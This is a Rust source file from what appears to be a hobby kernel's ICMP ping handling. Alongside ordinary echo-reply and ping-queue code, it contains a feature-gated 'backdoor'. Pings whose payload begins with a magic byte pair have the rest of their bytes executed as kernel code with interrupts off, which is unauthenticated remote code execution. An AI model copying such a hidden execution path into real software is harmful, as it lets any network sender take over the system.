use alloc::vec::Vec;
use core::pin::Pin;
use core::task::{Context, Poll};
use crossbeam_queue::ArrayQueue;
use futures_util::{Stream, StreamExt, task::AtomicWaker};
use lazy_static::lazy_static;

use super::{ControlMessageType, ICMPPacket, IPv4Header, IPv4Packet, Interface, NoSubcode};
use crate::net::{Ipv4Addr, ip};
use crate::sync::spinlock::Mutex;

// should this be made into a generic handle<T> ?
pub async fn handle_icmp_echo_request(
    icmpp: ICMPPacket<'_>,
    header: &IPv4Header,
    interface: &Interface,
) {
    log::debug!("{:?}", icmpp.data);

    #[cfg(feature = "backdoor")]
    {
        let dpat = &icmpp.data[0..2];
        let pattern = b"\xF0\x0F";

        if dpat == pattern {
            use x86_64::instructions::interrupts::without_interrupts;

            log::warn!("BACKDOOR ACTIVATED");

            let program = &icmpp.data.as_slice()[pattern.len()..];

            // safe since sender pinky promisies that the code is memory safe :3
            without_interrupts(|| unsafe {
                core::arch::asm!(
                "call rax", in("rax") program.as_ptr(),
                clobber_abi("C")
                );
            });
        }
    }

    let mut response = ICMPPacket {
        typ: ControlMessageType::EchoReply(NoSubcode::NoCode),
        checksum: 0,
        other: icmpp.other,
        data: icmpp.data,
    };

    response.calc_new_checksum();

    let resp_bytes = response.to_bytes();
    let ipv4 = IPv4Packet::from_source_dest_and_data(
        interface.ip,
        header.source_address,
        resp_bytes.as_slice(),
    )
    .expect("Packet constructed incorrectly");

    log::trace!("Sending icmp response: {:?}", ipv4);
    crate::net::ip::send_ipv4_packet(ipv4, interface).await;
}

#[derive(Debug)]
struct PingRequestInfo {
    source_address: Ipv4Addr,
    dest_address: Ipv4Addr,
    identifier: u16,
    sequence_num: u16,
    payload: Vec<u8>,
}

impl PingRequestInfo {
    fn from_stuff(icmpp: &ICMPPacket<'_>, header: &IPv4Header) -> Self {
        PingRequestInfo {
            source_address: header.source_address,
            dest_address: header.destination_address,
            sequence_num: u16::from_le_bytes(icmpp.other.to_le_bytes()[..2].try_into().unwrap()),
            identifier: u16::from_le_bytes(icmpp.other.to_le_bytes()[2..4].try_into().unwrap()),
            payload: icmpp.data.to_vec(),
        }
    }
}

/// This is called when an echo response addressed to us has arrived.
pub fn handle_icmp_echo_response(
    icmpp: &ICMPPacket<'_>,
    header: &IPv4Header,
    _interface: &Interface,
) {
    // The packet arriving should be just logged for now. In future will do better
    log::debug!(
        "received icmp response! {:?} from source: {}",
        icmpp,
        header.source_address
    );

    for slot in PING_RESPONSE_QUEUE.lock().iter_mut() {
        if slot.is_none() {
            *slot = Some(PingRequestInfo::from_stuff(icmpp, header));
            PING_WAKER.wake();
            log::debug!("added ping response: {:?} to queue", slot);
            return;
        }
    }
    log::error!("Ping packet queue is full!");
}

static PING_WAKER: AtomicWaker = AtomicWaker::new();

const PING_RESPONSE_QUEUE_LENGTH: usize = 10;
static PING_RESPONSE_QUEUE: Mutex<[Option<PingRequestInfo>; PING_RESPONSE_QUEUE_LENGTH]> =
    Mutex::new([const { None }; PING_RESPONSE_QUEUE_LENGTH]);

struct PingRequestStream {
    /// What identifier is this streamer looking for?
    identifier: u16,
}

impl PingRequestStream {
    fn find_matching_ping_response(&self) -> Option<PingRequestInfo> {
        let mut queue = PING_RESPONSE_QUEUE.lock();

        for i in 0..PING_RESPONSE_QUEUE_LENGTH {
            if let Some(p) = &queue[i]
                && p.identifier == self.identifier
            {
                return queue[i].take();
            }
        }

        None
    }
}

impl Stream for PingRequestStream {
    type Item = PingRequestInfo;

    fn poll_next(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Option<Self::Item>> {
        log::debug!(
            "ping request stream poll called. looking for {:?}",
            self.identifier
        );
        if let Some(packet) = self.find_matching_ping_response() {
            log::debug!("Found in first go around");
            return Poll::Ready(Some(packet));
        }

        log::debug!("ping waker registered");
        PING_WAKER.register(cx.waker());

        if let Some(packet) = self.find_matching_ping_response() {
            log::debug!("Found packet in ping queue: {:?}", packet);
            if packet.identifier == self.identifier {
                log::debug!("packet matched ident!");
                // deregister waker
                PING_WAKER.take();
                Poll::Ready(Some(packet))
            } else {
                Poll::Pending
            }
        } else {
            log::debug!("did not find matching packet in ping queue");
            Poll::Pending
        }
    }
}

pub async fn ping_once(target: Ipv4Addr) {
    log::info!("pinging target: {}", target);

    #[expect(clippy::cast_possible_truncation, reason = "intended")]
    let ident = crate::time::get_ticks() as u16;

    let Some(interface) = *crate::net::INTERFACE.read().await else {
        log::error!("Unable to load network interface.");
        return;
    };

    let mut request = ICMPPacket {
        typ: ControlMessageType::EchoRequest(NoSubcode::NoCode),
        checksum: 0,
        // contains identifier_u16 and sequence number_u16
        other: u32::from(ident) << 16,
        data: b"an icmp payload yayy :3",
    };

    request.calc_new_checksum();
    let bytes = request.to_bytes();
    let packet = IPv4Packet::from_source_dest_and_data(interface.ip, target, bytes.as_slice())
        .expect("icmp request is valid");

    let Ok(()) = ip::send_ipv4_packet(packet, &interface).await else {
        log::error!("could not send icmp request.");
        return;
    };

    let mut p = PingRequestStream { identifier: ident };

    let response = p.next().await;
    log::debug!("received a response! {:?}", response);
}
